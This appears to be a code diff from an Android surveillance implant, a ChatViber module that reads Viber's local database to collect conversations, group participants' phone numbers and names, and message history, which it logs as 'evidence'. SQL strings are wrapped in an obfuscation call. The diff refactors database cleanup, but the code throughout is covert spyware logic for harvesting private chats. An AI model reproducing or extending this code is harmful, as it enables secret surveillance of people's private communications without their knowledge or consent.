@@ -10,9 +10,6 @@ import java.util.List;
 import java.util.concurrent.Semaphore;
 
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
-import android.database.sqlite.SQLiteQueryBuilder;
-import android.util.Pair;
 
 
 import com.android.dvci.auto.Cfg;
@@ -128,39 +125,38 @@ public class ChatViber extends SubModuleChat {
 				}
 				return;
 			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readChatMessages): can read DB");
-			}
-			helper.deleteAtEnd = false;
-			// SQLiteDatabase db = helper.getReadableDatabase();
+			try {
+				// SQLiteDatabase db = helper.getReadableDatabase();
 
-			groups = new ChatViberGroups();
+				groups = new ChatViberGroups();
 
-			long newViberReadDate = 0;
-			List<ViberConversation> conversations = getViberConversations(helper, account, lastViberReadDate);
-			for (ViberConversation sc : conversations) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readViberMessageHistory) conversation: " + sc.id + " date: " + sc.date);
+				long newViberReadDate = 0;
+				List<ViberConversation> conversations = getViberConversations(helper, account, lastViberReadDate);
+				for (ViberConversation sc : conversations) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readViberMessageHistory) conversation: " + sc.id + " date: " + sc.date);
+					}
+
+					// retrieves the lastConvId recorded as evidence for this
+					// conversation
+					String thread = Long.toString(sc.id);
+
+					if (sc.isGroup() && !groups.hasMemoizedGroup(thread)) {
+						fetchParticipants(helper, thread);
+						groups.addPeerToGroup(thread, account);
+					}
+
+					long lastReadId = fetchMessages(helper, sc, lastViberReadDate);
+					newViberReadDate = Math.max(newViberReadDate, lastReadId);
+
 				}
-
-				// retrieves the lastConvId recorded as evidence for this
-				// conversation
-				String thread = Long.toString(sc.id);
-
-				if (sc.isGroup() && !groups.hasMemoizedGroup(thread)) {
-					fetchParticipants(helper, thread);
-					groups.addPeerToGroup(thread, account);
+				if (newViberReadDate > 0) {
+					lastViberReadDate = newViberReadDate;
+					updateMarkupViber(lastViberReadDate, true);
 				}
-
-				long lastReadId = fetchMessages(helper, sc, lastViberReadDate);
-				newViberReadDate = Math.max(newViberReadDate, lastReadId);
-
+			}finally {
+				helper.disposeDb();
 			}
-			if (newViberReadDate > 0) {
-				lastViberReadDate = newViberReadDate;
-				updateMarkupViber(lastViberReadDate, true);
-			}
-			helper.deleteDb();
 
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -246,7 +242,7 @@ public class ChatViber extends SubModuleChat {
 		};
 
 		String sqlquery = M.e("SELECT P._id,  I.number, I.display_name, I.contact_name, I.participant_type from participants as P join participants_info as I on P.participant_info_id = I._id where conversation_id = ?");
-		helper.traverseRawQuery(sqlquery, new String[] { thread_id }, visitor, true);
+		helper.traverseRawQuery(sqlquery, new String[] { thread_id }, visitor);
 
 	}
 
@@ -385,7 +381,7 @@ public class ChatViber extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRawQuery(sqlQuery, new String[] {}, visitor, true);
+		helper.traverseRawQuery(sqlQuery, new String[] {}, visitor);
 		return callInfo.valid;
 	}
 
